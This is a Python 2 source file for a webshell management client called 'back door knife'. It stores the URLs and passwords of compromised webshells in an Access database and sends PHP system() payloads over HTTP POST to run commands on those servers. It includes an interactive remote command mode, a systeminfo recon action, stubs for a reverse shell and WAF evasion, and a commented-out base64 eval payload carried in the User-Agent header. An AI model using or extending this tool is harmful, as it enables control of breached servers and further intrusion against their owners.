#-- coding:utf-8 --
import getopt
import sys
import urllib
import urllib2
import base64
import pyodbc
import sys

class MyCahe():
    def __init__(self):
        self.cahe = {}
        self.maxsize = 50

#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

def help():
    print 'back door knife'
    print ''
    print 'writen by UD94'
    print 'USAGE:'
    print '     -a ,--action : the action which you want to take, like add, delete ,exec'
    print '     -u ,--url :the url of one sentence'
    print '     -p ,--password: the password of webshell'
    print '     -h ,--help : help message'


def act(cursor):
    action = ''
    url = ''
    password = ''
    shell_type = ''
    help()

    o, a = getopt.getopt(sys.argv[1:], 'a:p:hu:', ['action', 'password', 'help', 'url'])

    for o, a in o:
        if o in ('-a', '--action'):
            action = a
        elif o in ('-p', '--password'):
            password = a
        elif o in ('-h', '--help'):
            help()
        elif o in ('-u', '--url'):
            url = a

    while True:
        if not action:
            print 'please input usage -a'
            help()
            sys.exit()

        if action == 'add':
            if not url:
                print 'please input url'
                url = raw_input('->')

            if not password:
                print 'please input password'
                password = raw_input('->')

            shell_type = type_check(url)

            add(cursor,url,password,shell_type)
        elif action == 'exec':
            if not url:
                print 'please input url'
                url = raw_input('->')

            if not password:
                print 'please input password'
                password = raw_input('->')

            shell_type = type_check(url)

            exec_webshell(url,password)
        elif action == 'delete':

            if not url:
                print 'please input url'
                url = raw_input('->')
            delete(cursor,url)
        elif action == 'check':
            check(cursor)

        action = raw_input('continue action:')
        url = ''
        password = ''
        shell_type = ''


def type_check(url):
    if 'php' in url:
        shell_type = 'php'
    elif 'asp' in url:
        shell_type = 'asp'
    elif 'aspx' in url:
        shell_type = 'aspx'
    elif 'jsp' in url:
        shell_type = 'jsp'
    else:
        print 'unknown type,please input '
        shell_type = raw_input('->:')
    return shell_type


def connect_access():
    DBfile = './cd.accdb'
    conn = pyodbc.connect(r'DRIVER={Microsoft Access Driver (*.mdb, *.accdb)};DBQ=' + DBfile + '; Provider=MSDASQL;')
    return conn

def disconnect(conn):
    conn.cursor().close()
    conn.close()

def add(cursor,url,password,shell_type):
    SQL = "INSERT INTO table1(url, password,shell_type)VALUES('" + url + "','"+password+"','"+shell_type+"')"
    cursor.execute(SQL)
    cursor.commit()

def check(cursor):
    SQL = 'SELECT * from table1;'
    for row in cursor.execute(SQL):
        print row.url,row.password

def delete(cursor,url):
    SQL = 'delete from table1 where url = '+ url
    cursor.execute(SQL)
    cursor.commit()


def action_function():
    print 'the function of tool'
    print 'cmdline'.ljust(20) + ':go to cmd-mode'
    print 'informatioin packet'.ljust(20) + ':list the information of aim'
    print 'rebound'.ljust(20) + ':rebound a interactive shell'
    print 'waf_mode'.ljust(20) + ':go to waf-mode to pass the waf'
    print 'clear_cahe'.ljust(20) + ':clear the cahe of aim'
    print 'get_cahe'.ljust(20) + ':get the struct of aim'
    print 'function'.ljust(20) + ':the funciton of the tool'
    print 'exit'.ljust(20) + ':exit the knife'

def exec_webshell(url,password):

    if 'http://' in url:
        pass
    else:
        url = 'http://' + url

    while True:

        action_shell = raw_input('action shell->')

        if action_shell == 'cmdline':
            data = "system('echo %cd%',$out);echo $out;"
            q = {password:data}
            q = urllib.urlencode(q)
            req = urllib2.Request(url,q)
            response = urllib2.urlopen(req)
            page = response.readlines()

            while True:

                data = raw_input(page[0].strip() + '\\')
                data = "system("+ data +",$out);echo $out;"
                q = {password: data}
                q = urllib.urlencode(q)
                req = urllib2.Request(url, q)
                response = urllib2.urlopen(req)
                result = response.readlines()
                print result[0]

                data = "system('echo %cd%',$out);echo $out;"
                q = {password: data}
                q = urllib.urlencode(q)
                req = urllib2.Request(url, q)
                response = urllib2.urlopen(req)
                page = response.readlines()


        elif action_shell == 'information packet':

            try:
                data = "system('echo %cd%',$out);echo $out;"
                q = {password: data}
                q = urllib.urlencode(q)
                req = urllib2.Request(url, q)
                response = urllib2.urlopen(req)
                page = response.readlines()
            except:
                print 'failed!please try waf_mode'
                continue

            data = "system('systeminfo',$out);echo $out;"
            q = {password: data}
            q = urllib.urlencode(q)
            req = urllib2.Request(url, q)
            response = urllib2.urlopen(req)
            page = response.readlines()


        elif action_shell == 'rebound':
            pass
        elif action_shell == 'waf_mode':
            pass
        elif action_shell == 'clear_cahe':
            pass
        elif action_shell == 'get_cahe':
            pass
        elif action_shell == 'function':
            action_function()
        elif action_shell == 'exit':
            break
        else:
            print 'unkown command!'
            action_function()
            print 'please input again'

    #data = "system('echo %cd%',$out);echo $out;"
    #data = base64.b64encode(data)
    #req = urllib2.Request(url)
    #data = '$'+ password +' = base64_decode(\'' + data + '\');@eval($'+ password +');'
    #req.add_header('User-Agent', data)
    #response = urllib2.urlopen(req)
    #page = response.read()
    #print page


def main():
    conn = connect_access()
    cursor = conn.cursor()
    act(cursor)
    disconnect(conn)

#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
if __name__ == '__main__':
    main()